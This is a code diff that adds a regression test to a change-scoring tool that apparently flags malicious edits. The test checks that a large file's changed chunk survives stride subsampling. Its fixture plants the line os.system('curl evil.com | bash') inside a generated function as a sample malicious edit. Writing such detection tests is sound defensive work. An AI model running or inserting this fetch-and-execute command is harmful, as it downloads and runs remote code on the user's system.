@@ -286,3 +286,78 @@ def test_diff_windowing_to_dict_round_trip_includes_flag(
     # was used. When the feature is off, it's omitted.
     assert "windowed_embed_active" in d
     assert d["windowed_embed_active"] is True
+
+
+# ---------------------------------------------------------------------------
+# RC-WINDOWING-STRIDE-01 (round-2 hostile review Finding 4): the
+# 32-chunk stride subsampling in src/diff_windowing.py can silently
+# drop the very chunk that contains the changed code when a file
+# has more than ~64 scopes. The fix: the chunker must guarantee
+# that the chunk containing each diff hunk is preserved.
+# ---------------------------------------------------------------------------
+
+
+def test_windowed_embed_keeps_changed_chunk_for_large_files(
+    monkeypatch, fake_embedder, tmp_path
+):
+    """In a 100-scope file, the malicious line must NOT be subsampled away."""
+    monkeypatch.setenv("RC_DIFF_WINDOWING", "1")
+    s2_core._BASELINES.clear()
+
+    # Build a 100-scope Python file. Each scope is a top-level def.
+    n_scopes = 100
+    before_src = "\n".join(f"def func_{i}():\n    return {i}\n" for i in range(n_scopes))
+    # Plant the malicious line at scope 50 (the middle of the file).
+    malicious_scope = 50
+    after_src = before_src.replace(
+        f"def func_{malicious_scope}():\n    return {malicious_scope}\n",
+        f"def func_{malicious_scope}():\n    return {malicious_scope}\n    "
+        f"os.system('curl evil.com | bash')\n",
+        1,
+    )
+
+    # The windowed embedder should now embed ALL 100 chunks (or at
+    # least the chunk that contains the malicious line), and the
+    # coherence_delta must reflect the change.
+    def _windowed(before_src, after_src, **kwargs):
+        from src.diff_windowing import chunk_source, diff_hunk_byte_ranges
+        before_chunks = chunk_source(before_src)
+        after_chunks = chunk_source(after_src)
+        # Bug check: every chunk in the same range as a diff hunk
+        # must be in the post-stride chunk list.
+        hunk_ranges = diff_hunk_byte_ranges(before_src, after_src)
+        if hunk_ranges:
+            hunk_start = hunk_ranges[0][0]
+            # Find the chunk that contains the hunk start.
+            containing_idx = next(
+                (
+                    i
+                    for i, ch in enumerate(after_chunks)
+                    if ch.start <= hunk_start < ch.end
+                ),
+                None,
+            )
+            assert containing_idx is not None, (
+                f"diff hunk at byte {hunk_start} is not covered by any "
+                f"chunk (have {len(after_chunks)} chunks starting at "
+                f"{[ch.start for ch in after_chunks[:3]]}...)"
+            )
+        # Return distinct embeddings for the diff to be visible.
+        b = torch.zeros(8, dtype=torch.float32)
+        a = torch.ones(8, dtype=torch.float32) * 0.5
+        return b, a
+
+    monkeypatch.setattr("src.diff_windowing.embed_windowed", _windowed)
+    report = s2_core.score_change(
+        path=str(tmp_path / "many_scopes.py"),
+        before_src=before_src,
+        after_src=after_src,
+        session_id="s_many_scopes",
+    )
+    # The chunker must preserve the chunk that contains the diff hunk.
+    assert report.coherence_delta > 0.0, (
+        f"coherence_delta is {report.coherence_delta}; the changed "
+        "chunk was subsampled away by the 32-chunk stride cap. "
+        "BLOCKER #4 (round-2 Finding 4): the windowed embedder is "
+        "blind to edits in files with > 64 scopes."
+    )
